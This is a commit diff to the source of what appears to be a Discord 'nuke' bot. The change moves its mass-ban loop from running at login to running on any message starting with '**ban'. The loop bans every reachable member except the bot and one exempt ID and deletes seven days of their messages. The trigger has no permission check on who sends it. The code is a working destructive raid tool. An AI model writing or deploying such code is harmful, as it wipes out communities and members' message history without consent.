3d9ebd98d7754b2540ea93cb2707c3c8b8e5d900
Dqu1J <mcpeytwot5@gmail.com>
2020-01-31 23:58:12 +0200

    Update bot.py

--- bot.py
+++ bot.py
@@ -11,22 +11,26 @@ client = discord.Client()
 
 @client.event
 async def on_ready():
-    print('Logged in!')
-    for member in client.get_all_members():
-        print(f"Banning {member.display_name}!")
-        if str(member.id) == botid:
-            print("Oops! It is me!")
-            continue
-        if str(member.id) == nobanid:
-            if noban == True:
-                print("Oops! We dont ban him.")
+    print('Logged in as {0.user}'.format(client))
+
+@client.event
+async def on_message(message):
+    if message.content.startswith('**ban'):
+        for member in client.get_all_members():
+            print(f"Banning {member.display_name}!")
+            if str(member.id) == botid:
+                print("Oops! It is me!")
                 continue
-        try:
-            await member.ban(reason="Thor has hit you with his hammer!", delete_message_days=7)
-        except:
-            print(f"Oops! I cant ban {member.display_name} for some reason! Maybe he is owner?")
-            continue
-        print(f"Banned {member.display_name}!")
-    print("Banning is complete!")
+            if str(member.id) == nobanid:
+                if noban == True:
+                    print("Oops! We dont ban him.")
+                    continue
+            try:
+                await member.ban(reason="Thor has hit you with his hammer!", delete_message_days=7)
+            except:
+                print(f"Oops! I cant ban {member.display_name} for some reason! Maybe he is owner?")
+                continue
+            print(f"Banned {member.display_name}!")
+        print("Banning is complete!")
 
 client.run(os.environ['DISCORD_TOKEN'], bot=True)
